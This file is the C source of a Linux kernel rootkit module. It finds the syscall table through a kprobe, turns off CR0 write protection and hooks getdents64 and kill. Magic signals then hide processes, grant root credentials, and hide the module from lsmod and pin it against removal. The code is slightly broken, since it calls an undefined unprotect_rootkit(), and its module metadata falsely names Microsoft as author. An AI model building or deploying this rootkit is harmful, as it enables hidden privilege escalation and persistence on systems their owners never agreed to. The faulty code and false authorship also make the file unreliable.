#include <linux/init.h>		
#include <linux/module.h>	
#include <linux/kernel.h>	
#include <linux/list.h>		
#include <linux/cred.h>		
#include <linux/fs.h>           
#include <linux/cdev.h>         
#include <linux/device.h>       
#include <linux/device/class.h> 
#include <linux/uaccess.h>      
#include <linux/ioctl.h>        
#include <linux/syscalls.h>     
#include <linux/slab.h>         
#include <linux/sched.h>        
#include <linux/fdtable.h>      
#include <linux/proc_ns.h>	
#include <linux/kprobes.h>
#include <linux/dirent.h>
#include <asm/ptrace.h>		
		
#define PF_INVISIBLE 0x10000000

#define GET_ROOT 64
#define HIDE_UNHIDE_PROCESS 65
#define HIDE_ROOTKIT 66
#define SHOW_ROOTKIT 67

static struct list_head *prev_module_in_proc_modules_lsmod;

int is_hidden_proc = 0;
int is_hidden_sys = 0;

unsigned long cr0;

static unsigned long *__sys_call_table;

typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);

static tt_syscall orig_getdents64;
static tt_syscall orig_kill;

static struct kprobe kp = {
            .symbol_name = "kallsyms_lookup_name"
};

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Microsoft");
MODULE_DESCRIPTION("fuck you linus");
MODULE_VERSION("6.6.6");

/* HIDE ROOTKIT */
static void hide_rootkit(void)
{
        if (is_hidden_proc)
	{
		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM is already hidden from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path \n");
		return;
	}

	prev_module_in_proc_modules_lsmod = THIS_MODULE->list.prev;

	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hiding LKM from `lsmod` cmd, `/proc/modules` file path and `/proc/kallsyms` file path \n");

	list_del(&THIS_MODULE->list);

	is_hidden_proc = 1;
}

/* SHOW ROOTKIT */
static void show_rootkit(void)
{
        if (!is_hidden_proc)
	{
		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM is already revealed to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");
		return;
	}
	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ revealing to `lsmod` cmd, in `/proc/modules` file path and `/proc/kallsyms` file path \n");

	list_add(&THIS_MODULE->list, prev_module_in_proc_modules_lsmod);
	
	is_hidden_proc = 0;
}

/* PROTECT ROOTKIT (FROM DELETING) */
static int is_protected = 0;
static void protect_rootkit(void)
{
	if (is_protected == 0)
	{
		try_module_get(THIS_MODULE);
		is_protected = 1;
		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ PROTECT ROOTKIT\n");
	}
}

/* UNPROTECT ROOTKIT (FROM DELETING) */
static void remove_rootkit(void)
{
	if (is_protected == 1)
	{
		module_put(THIS_MODULE);
		is_protected = 0;
		printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ UNPROTECT ROOTKIT\n");
	}
}

/* GET SYS_CALL_TABLE */
unsigned long *get_syscall_table(void)
{
	unsigned long *syscall_table;

	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);

	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
}


/* FORCE CR0 */
static inline void write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;
	
	asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

/* PROTECT MEMORY */
static inline void protect_memory(void)
{
	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ PROTECT MEMORY\n");
	write_cr0_forced(cr0);
}

/* UNPROTECT MEMORY */
static inline void unprotect_memory(void)
{
	pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ UNPROTECT MEMORY\n");
	write_cr0_forced(cr0 & ~0x00010000);
}

/* FIND TASKS */
struct task_struct *find_task(pid_t pid)
{
	struct task_struct *target_process = current;

	for_each_process(target_process)
	{
		if (target_process->pid == pid)
		{
			return target_process;
		}
	}
	return NULL;
}

/* IS INVISIBLE */
static int is_invisible(pid_t pid)
{
	struct task_struct *task;

	if (!pid)
	{
		return 0;
	}

	task = find_task(pid);
	if (!task)
	{
		return 0;
	}
	if (task->flags & PF_INVISIBLE)
	{
		return 1;
	}
	return 0;
}

/* HACK GETDENTS 64 */
static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
{
	int fd = (int) pt_regs->di;

	struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;

	int ret = orig_getdents64(pt_regs), err;

	unsigned short proc = 0;
	unsigned long offset = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;

	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);

	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);

	if (err)
		goto out;
	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
		proc = 1;

	while (offset < ret)
	{
		dir = (void *)kdirent + offset;
		if ((proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
		{
			if (dir == kdirent)
			{
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		}
		else
		{
			prev = dir;
		}
		offset += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err) {goto out;}

out:
	kfree(kdirent);
	return ret;
}

/* SET ROOT */
static void set_root(void)
{
	struct cred *root = prepare_creds();

	if (root == NULL)
	{
		return;
	}

	root->uid.val = root->gid.val = 0;
	root->euid.val = root->egid.val = 0;
	root->suid.val = root->sgid.val = 0;
	root->fsuid.val = root->fsgid.val = 0;

	commit_creds(root);
}

/* HACK KILL */
static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
	pid_t pid = (pid_t) pt_regs->di;
	int sig = (int) pt_regs->si;

	struct task_struct *task;
	switch (sig)
	{
		case HIDE_UNHIDE_PROCESS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;

			task->flags = task->flags ^ PF_INVISIBLE;
			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hiding/unhiding pid: %d \n", pid);
			break;
		case GET_ROOT:
			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ offering root shell!!\n");

			set_root();
			break;
		case HIDE_ROOTKIT:
			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hiding LKM\n");

			protect_rootkit();
			hide_rootkit();
			break;
		case SHOW_ROOTKIT:
			printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ showing LKM\n");

			unprotect_rootkit();
			show_rootkit();
			break;
		default:
			return orig_kill(pt_regs);
	}
	return 0;
}

/* INIT */
static int __init rootkit_init(void)
{
	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM loaded \n");

	hide_rootkit();

	__sys_call_table = get_syscall_table();
	if (!__sys_call_table)
		return -1;
	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ sys_call_table address: 0x%px \n", __sys_call_table);
        printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hack_getends64 address: 0x%px \n", hacked_getdents64);
        printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ hack_kill address: 0x%px \n", hacked_kill);

	cr0 = read_cr0();

	orig_getdents64 = (tt_syscall)__sys_call_table[__NR_getdents64];
	orig_kill = (tt_syscall)__sys_call_table[__NR_kill];

	unprotect_memory();

	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

	protect_memory();
	
        return 0;
}


/* EXIT */
static void __exit rootkit_exit(void)
{
	unprotect_memory();
	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ sys_call_table setting to default\n");

	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;

	protect_memory();

	printk(KERN_INFO "ᛗᚨᛚᛖᚠᛁᚴ ~ LKM unloaded \n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

